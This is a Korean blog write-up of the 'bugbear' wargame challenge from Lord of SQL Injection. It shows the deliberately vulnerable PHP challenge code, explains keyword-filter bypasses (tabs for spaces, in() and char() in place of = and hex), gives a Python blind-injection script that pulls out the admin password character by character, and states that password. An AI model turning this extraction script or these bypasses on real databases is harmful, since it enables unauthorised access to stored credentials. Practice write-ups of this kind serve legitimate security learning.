---
layout: post
title: ! "[LOS] bugbear"
categories: [LOS]
excerpt: " "
comments: true
share: true
tags:
  - LOS
  - Web-hacking
  - bugbear
  - write-up
---

![]({{ site.baseurl }}/assets/posts/los/bugbear.png)

`query : select id from prob_bugbear where id='guest' and pw='' and no=`

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```

bugbear 문제에서는 darknight문제와 비교하여 =,like,0x,공백이 추가 되었다.
다른 분들의 darknight 풀이를 보니 hex값을 이용하신 분들도 꽤 계셔서 0x 필터링이 생긴 것 같다.

1. 공백 -> %09
2. =,like -> in() 함수
3. 0x -> char() 함수

=과 like를 우회하기 위해 >,< 도 사용한다고 하여 < 를 이용해 패스워드의 길이를 구해보았다.

![]({{ site.baseurl }}/assets/posts/los/bugbear_admin.png)

### 코드
```php
from requests import get
import string
from time import sleep


url ="https://los.eagle-jump.org/bugbear.php"
cookies = dict(PHPSESSID="")
special_strings = "~!@#$%^&*()+-_{}[]<>"
alpha = string.ascii_letters+string.digits+special_strings
result = ""

for i in range(1,20):
    parameter = "?pw=1&no=1||length(pw)<"+str(i)
    new_url = url + parameter
    r = get(new_url, cookies=cookies)

    if r.text.find("Hello admin") > 0:
        length = i + 1
        print("password length is "+str(i))
        break
for i in range(1, length):
    for a in range(48,128):
        parameter ="?pw=1&no=1||id%09in(char(97,100,109,105,110))%26%26mid(pw,"+str(i)+",1)%09in(char("+str(a)+"))"
        new_url = url + parameter
        r = get(new_url, cookies=cookies)

        if r.text.find("Hello admin") > 0:
            print(str(i) + " -> "+chr(a))
            result += chr(a)
            break

    if i == 1 and result == "":
        print("password not found")
        exit(0)

    if i == length-1:
        print("\npassword is "+result)
        print("\n")
```

저번 코드와 달라진 점이라면 길이를 구하는 부분과 char(~) 함수를 in() 으로 감싸준 것과 공백을 %09로 바꾼 것이다.

![]({{ site.baseurl }}/assets/posts/los/bugbear_result.png)

결과에서 패스워드의 길이가 9로 나온 이유는 length(pw)<9 를 했을 때 Hello admin이 떴기 때문에 9가 뜬 것이다.
원래 패스워드의 길이는 8이다.
마찬가지로 위 결과에서 알파벳을 소문자로 바꿔주고 `?pw=735c2773` 를 해주면 된다.

![]({{ site.baseurl }}/assets/posts/los/bugbear_clear.png)
